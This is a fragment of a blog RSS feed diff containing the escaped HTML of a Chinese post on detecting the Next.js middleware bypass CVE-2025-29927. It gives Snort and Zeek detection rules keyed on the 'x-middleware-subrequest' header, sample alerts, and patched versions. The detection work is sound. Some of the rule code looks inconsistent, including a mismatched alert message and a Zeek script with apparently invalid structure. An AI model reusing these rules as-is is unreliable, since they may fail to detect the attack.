+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert tcp any any -&amp;gt; any any &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg: &lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP &amp;#39;x-middleware-request&amp;#39; header detected&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; content:&lt;span class=&#34;s2&#34;&gt;&amp;#34;x-middleware-subrequest&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  rawbytes&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; sid:10000001&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; rev:1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;现在，我们可以运行 Snort 并测试其检测效果。下面的终端以控制台模式运行 Snort，以演示警报触发过程。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@yrc-2404:/var/log/snort$ sudo snort -q -l /var/log/snort -i ens5 -A console -c /etc/snort/snort.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;03/24-20:16:13.424299  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;**&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1:10000001:1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; HTTP &lt;span class=&#34;s1&#34;&gt;&amp;#39;x-middleware-request&amp;#39;&lt;/span&gt; header detected &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;**&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Priority: 0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; 10.10.142.69:49432 -&amp;gt; 10.10.219.251:3000
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;了解zeek&#34;&gt;[了解]Zeek
+&lt;/h3&gt;&lt;p&gt;Zeek 为网络流量中的威胁检测提供了更全面的方案。对于 CVE -2025-29927，可以使用以下 Zeek 规则：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CVE_2025_29927&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;redef&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;enum&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LOG&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_policy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PolicyHook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IGNORE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http_header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;connection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is_orig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;x-middleware-subrequest&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;middleware&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestamp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start_time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;note&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CVE_2025_29927_Exploit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Detected HTTP header associated with CVE-2025-29927&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;           &lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;notice_info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;CVE-2025-29927 Exploit&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;The HTTP header &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; associated with CVE-2025-29927 was detected&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;确保此文件以 &lt;code&gt;.zeek&lt;/code&gt; 扩展名保存在 Zeek 脚本的配置目录中。您需要修改 &lt;code&gt;local.zeek&lt;/code&gt; 文件，通过添加 &lt;code&gt;@load ./cve_2025_29927.zeek&lt;/code&gt; 来包含此脚本。&lt;/p&gt;
+&lt;p&gt;最后，通过 &lt;code&gt;sudo zeekctl deploy&lt;/code&gt; 重启 Zeek 以应用配置更改。如果成功，当检测到 CVE -2025-29927 时， Zeek 将会发出警报：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Connnection_ID] The HTTP header &amp;#34;x-middleware-subrequest&amp;#34; associated with CVE-2025-29927 was detected
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结
+&lt;/h2&gt;&lt;p&gt;查看关于发现此漏洞的原始帖子，许多流行应用程序的源代码中仍然潜伏着许多漏洞。对于已修复的版本，用户需要升级到以下版本：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Next.js 15.x 应该升级到 15.2.3&lt;/li&gt;
+&lt;li&gt;Next.js 14.x 应该升级到 14.2.25&lt;/li&gt;
+&lt;li&gt;Next.js 13.x 应该升级到 13.5.9&lt;/li&gt;
+&lt;li&gt;Next.js 12.x 应该升级到 12.3.5&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果修补不可行，唯一的解决方法是阻止包含 &lt;code&gt;x-middleware-subrequest&lt;/code&gt; 的 HTTP 请求到达您的 Web 应用程序。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Burpsuite利用宏爆破回显在响应包的验证码网页</title>
         <link>https://Yerucrem.github.io/p/burpsuite%E5%88%A9%E7%94%A8%E5%AE%8F%E7%88%86%E7%A0%B4%E5%9B%9E%E6%98%BE%E5%9C%A8%E5%93%8D%E5%BA%94%E5%8C%85%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BD%91%E9%A1%B5/</link>
         <pubDate>Tue, 15 Apr 2025 00:00:00 +0000</pubDate>
